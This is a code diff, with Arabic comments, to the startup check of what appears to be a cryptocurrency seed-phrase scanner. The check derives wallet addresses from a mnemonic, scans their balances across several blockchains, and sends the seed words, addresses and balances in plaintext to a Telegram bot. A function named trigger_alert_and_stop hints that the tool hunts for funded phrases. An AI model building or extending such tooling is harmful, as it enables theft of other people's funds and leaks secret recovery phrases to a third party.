@@ -167,20 +167,40 @@ def run_startup_test():
         send_telegram_alert("✅ تم تشغيل السيرفر بنجاح وهو يعمل الآن.")
         return
 
-    test_msg = "✅ تم تشغيل السيرفر بنجاح.\n\nنتائج التشييك:\n"
+    test_msg = "✅ تم تشغيل السيرفر بنجاح.\n\nنتائج التشييك:\n\n"
     found_any = False
-    try:
-        if TEST_MNEMONIC:
-            wallets = derive_all_wallet_addresses(TEST_MNEMONIC)
-            active_data = scan_wallet_concurrently(wallets)
-            if active_data:
-                found_any = True
-                test_msg += f"🔑 كلمات: {TEST_MNEMONIC}\n🌐 الشبكة: {active_data['network']}\n📬 العنوان: {active_data['address']}\n💎 الرصيد: {active_data['balance']}\n"
-    except Exception:
-        pass
 
+    # 1. فحص العنوان المباشر أولاً
+    if TEST_ADDRESS:
+        try:
+            # نضع العنوان في القاموس ليتم فحصه في جميع الشبكات
+            addr_wallets = {
+                "EVM": [TEST_ADDRESS], "BTC_Native": [TEST_ADDRESS], "BTC_SegWit": [TEST_ADDRESS], 
+                "BTC_Legacy": [TEST_ADDRESS], "TRX": [TEST_ADDRESS], "SOL": [TEST_ADDRESS], "LTC": [TEST_ADDRESS], "DOGE": [TEST_ADDRESS]
+            }
+            active_addr_data = scan_wallet_concurrently(addr_wallets)
+            if active_addr_data:
+                found_any = True
+                test_msg += f"🎯 فحص العنوان المباشر:\n🌐 الشبكة: {active_addr_data['network']}\n📬 العنوان: {active_addr_data['address']}\n💎 الرصيد: {active_addr_data['balance']} {active_addr_data.get('symbol', '')}\n📊 المعاملات: {active_addr_data.get('tx_count', 0)}\n\n"
+        except Exception:
+            pass
+
+    # 2. فحص المحافظ (الكلمات) ثانياً
+    if TEST_MNEMONIC:
+        try:
+            mnemo_wallets = derive_all_wallet_addresses(TEST_MNEMONIC)
+            active_mnemo_data = scan_wallet_concurrently(mnemo_wallets)
+            if active_mnemo_data:
+                found_any = True
+                test_msg += f"🎯 فحص الكلمات:\n🔑 الكلمات: {TEST_MNEMONIC}\n🌐 الشبكة: {active_mnemo_data['network']}\n📬 العنوان: {active_mnemo_data['address']}\n💎 الرصيد: {active_mnemo_data['balance']} {active_mnemo_data.get('symbol', '')}\n📊 المعاملات: {active_mnemo_data.get('tx_count', 0)}\n"
+        except Exception:
+            pass
+
+    # 3. إرسال الرسالة المجمعة
     if found_any:
         send_telegram_alert(test_msg)
+    else:
+        send_telegram_alert("✅ تم تشغيل السيرفر بنجاح وهو يعمل الآن.\n(تم إجراء التشييك ولكن لم يُعثر على رصيد أو معاملات)")
 
 def trigger_alert_and_stop(phrase, active_data):
     alert_message = (
